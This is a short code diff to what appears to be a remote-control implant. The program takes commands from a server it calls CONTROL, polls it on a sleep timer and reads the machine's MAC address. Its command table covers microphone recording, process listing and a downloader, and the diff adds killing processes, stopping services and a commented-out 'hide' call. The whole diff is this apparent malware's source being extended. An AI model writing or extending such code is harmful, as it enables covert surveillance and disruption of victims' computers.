@@ -78,7 +78,10 @@ def handle_input(message: str):
         "audio-record": a.handle_mic,
         "get-processes": lu.processes,
         "downloader": d.downloader,
-        "kill": k.kill_process,
+        "kill": lu.kill_process_cmd,
+        "kill-by-name": lu.kill_all_processes_by_name,
+        "get-all-services": lu.get_all_services_cmd,
+        "stop-service": lu.stop_service_cmd,
         "ip-add": add_ip
     }
 
@@ -98,6 +101,7 @@ def start_server():
     ip = CONTROL
     error_count = 0
     mac = get_mac()
+    #lu.hide()
     while True:
         time.sleep(get_sleep_time())
 
